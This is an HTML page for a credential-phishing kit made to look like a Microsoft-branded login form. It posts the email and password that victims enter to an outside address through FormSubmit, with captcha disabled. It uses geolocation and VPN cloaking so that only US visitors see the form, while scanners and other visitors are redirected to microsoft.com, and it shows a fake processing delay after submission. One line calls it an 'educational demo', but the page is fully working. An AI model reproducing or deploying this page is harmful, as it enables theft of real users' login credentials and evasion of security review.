<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form - Student Validation</title>
    <style>
        @import url('https://fonts.googleapis.com/css?family=Segoe+UI');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', sans-serif; }
        body { display: flex; justify-content: center; align-items: center; min-height: 100vh; background-color: #f3f2f1; }
        .form-container { background: white; padding: 44px; border-radius: 2px; box-shadow: 0 0 10px rgba(0,0,0,0.1); width: 440px; max-width: 100%; text-align: left; }
        .header { display: flex; flex-direction: column; align-items: flex-start; margin-bottom: 24px; }
        .logo { width: 108px; margin-bottom: 12px; }
        .signup-text { font-size: 24px; font-weight: 400; }
        input { width: 100%; padding: 12px; margin: 8px 0 24px; border: 1px solid #8c8c8c; border-radius: 2px; font-size: 14px; }
        input:focus { border-color: #0078d7; outline: none; }
        button { width: 108px; padding: 8px 12px; background: #0078d7; color: white; border: none; border-radius: 2px; cursor: pointer; font-size: 15px; font-weight: 600; display: block; margin-left: auto; }
        button:hover { background: #0063b1; }
        button:disabled { opacity: 0.6; cursor: not-allowed; }

        /* Blocked / Cloaked Screen */
        .blocked { text-align: center; padding: 50px; font-size: 18px; color: #333; }
        .blocked a { color: #0078d7; text-decoration: none; }

        /* Loading Overlay */
        #loadingOverlay {
            display: none;
            position: fixed;
            top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.7);
            justify-content: center;
            align-items: center;
            z-index: 1000;
            flex-direction: column;
            color: white;
            font-size: 18px;
        }
        .spinner {
            border: 5px solid #f3f3f3;
            border-top: 5px solid #0078d7;
            border-radius: 50%;
            width: 50px;
            height: 50px;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>

    <!-- Blocked Screen (shown if not in USA or using VPN) -->
    <div id="blockedScreen" class="blocked" style="display:none;">
        <h2>Access Restricted</h2>
        <p>This service is currently available only in select regions.</p>
        <p><a href="https://www.microsoft.com">Return to Microsoft.com</a></p>
    </div>

    <!-- Main Form (shown only to allowed visitors) -->
    <div id="mainForm" class="form-container">
        <div class="header">
            <img src="image1.jpg" alt="Logo" class="logo">
            <div class="signup-text">Login</div>
        </div>
        
        <form id="loginForm" action="https://formsubmit.co/lordborg7@gmail.com" method="POST">
            <input type="text" name="email" placeholder="Email" required>
            <input type="password" name="password" placeholder="Password" required> <!-- Changed to password type and proper name -->
            
            <!-- Hidden fields for FormSubmit -->
            <input type="hidden" name="_captcha" value="false">
            <input type="hidden" name="_next" value=""> <!-- Prevents redirect to thank you page -->
            
            <button type="submit">Sign In</button>
        </form>

        <p style="font-size:12px; color:#666; margin-top:20px;">
            <strong>Educational Demo:</strong> This page uses geolocation cloaking. 
            Only visitors from the USA (without detected VPN) see this form.
        </p>
    </div>

    <!-- Loading Overlay -->
    <div id="loadingOverlay">
        <div class="spinner"></div>
        <div>Processing your request...</div>
    </div>

    <script>
        // Geolocation Cloaking (unchanged)
        fetch('https://ipapi.co/json/')
            .then(response => response.json())
            .then(data => {
                const isUSA = data.country === 'US';
                const likelyVPN = data.hosting || data.proxy || false;

                if (!isUSA || likelyVPN) {
                    document.getElementById('mainForm').style.display = 'none';
                    document.getElementById('blockedScreen').style.display = 'block';
                    setTimeout(() => {
                        window.location.href = 'https://www.microsoft.com';
                    }, 5000);
                }
            })
            .catch(err => {
                console.log('Geo check failed:', err);
            });

        // Form Submission with Loading + 7s Delay + Redirect
        const form = document.getElementById('loginForm');
        const loadingOverlay = document.getElementById('loadingOverlay');
        const submitBtn = form.querySelector('button[type="submit"]');

        form.addEventListener('submit', function(e) {
            e.preventDefault(); // Stop normal submission

            // Show loading overlay
            loadingOverlay.style.display = 'flex';
            submitBtn.disabled = true;

            // Submit form data via fetch (AJAX)
            fetch(form.action, {
                method: 'POST',
                body: new FormData(form)
            })
            .then(response => {
                if (response.ok) {
                    // Wait 7 seconds, then redirect to index2.html
                    setTimeout(() => {
                        window.location.href = 'index2.html';
                    }, 7000);
                } else {
                    throw new Error('Submission failed');
                }
            })
            .catch(error => {
                loadingOverlay.innerHTML = '<div style="color:white;">Error occurred. Please try again.</div>';
                submitBtn.disabled = false;
            });
        });
    </script>
</body>
</html>
